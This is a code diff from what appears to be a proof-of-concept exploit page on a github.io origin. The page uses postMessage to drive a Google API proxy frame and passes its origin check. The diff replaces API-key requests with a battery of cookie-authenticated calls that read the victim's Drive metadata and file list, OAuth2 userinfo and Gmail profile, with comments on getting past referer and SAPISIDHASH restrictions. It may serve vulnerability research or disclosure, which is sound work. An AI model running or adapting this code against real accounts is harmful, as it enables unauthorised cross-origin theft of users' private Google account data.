@@ -187,11 +187,11 @@ window.addEventListener('message', function(e) {
         log('ok', '✅ Response: ' + JSON.stringify(data).substring(0, 400));
       }
     } else if (status === 401) {
-      log('warn', '401 — not logged in, or SAPISIDHASH failed.');
+      log('warn', '401 body: ' + String(bodyStr).substring(0, 500));
     } else if (status === 403) {
-      log('warn', '403 — ' + String(bodyStr).substring(0, 200));
+      log('warn', '403 body: ' + String(bodyStr).substring(0, 500));
     } else {
-      log('warn', 'Status ' + status + ': ' + String(bodyStr).substring(0, 300));
+      log('warn', 'HTTP ' + status + ' body: ' + String(bodyStr).substring(0, 500));
     }
   });
 });
@@ -203,25 +203,47 @@ function sendMakeHttpRequests() {
   log('ok', 'Sending makeHttpRequests to proxy via postMessage...');
   log('ok', 's:"makeHttpRequests" f:".." → _.$f.zo("..") = aa.parent = our origin → check passes.');
 
-  // CORRECT format: {key, params: {url, httpMethod, headers, body}}
-  // ai() reads k.key → response map key, k.params → passed to $h() which reads a.url + a.httpMethod
+  // Test battery: 4 endpoints to find which auth model works.
+  // Proxy injects X-Origin:majdch22.github.io and X-Referer:majdch22.github.io into every XHR.
+  // API keys with *.google.com restriction → 403 (X-Referer blocked).
+  // No SAPISIDHASH → authenticated endpoints return 401.
+  // Testing: (a) no key → cookie-only auth, (b) userinfo endpoint, (c) drive without key.
   const requests = [
+    // Drive about — NO API key, pure cookie auth test
     {
-      key: 'drive-files',
+      key: 'drive-about-nokey',
       params: {
-        url: '/drive/v3/files' +
-             '?key=' + DRIVE_KEY +
-             '&fields=files(id,name,mimeType,modifiedTime,size,webViewLink,parents)' +
-             '&pageSize=20&orderBy=modifiedTime+desc',
+        url: '/drive/v3/about?fields=user,storageQuota',
         httpMethod: 'GET',
         headers: {},
         body: null
       }
     },
+    // OAuth2 userinfo — historically accepts cookies on google.com origin
     {
-      key: 'drive-about',
+      key: 'userinfo',
       params: {
-        url: '/drive/v3/about?key=' + DRIVE_KEY + '&fields=user,storageQuota',
+        url: '/oauth2/v3/userinfo',
+        httpMethod: 'GET',
+        headers: {},
+        body: null
+      }
+    },
+    // Gmail profile — no key needed
+    {
+      key: 'gmail-profile',
+      params: {
+        url: '/gmail/v1/users/me/profile',
+        httpMethod: 'GET',
+        headers: {},
+        body: null
+      }
+    },
+    // Drive files — no key (bypass referer restriction)
+    {
+      key: 'drive-files-nokey',
+      params: {
+        url: '/drive/v3/files?fields=files(id,name,mimeType,modifiedTime)&pageSize=10',
         httpMethod: 'GET',
         headers: {},
         body: null
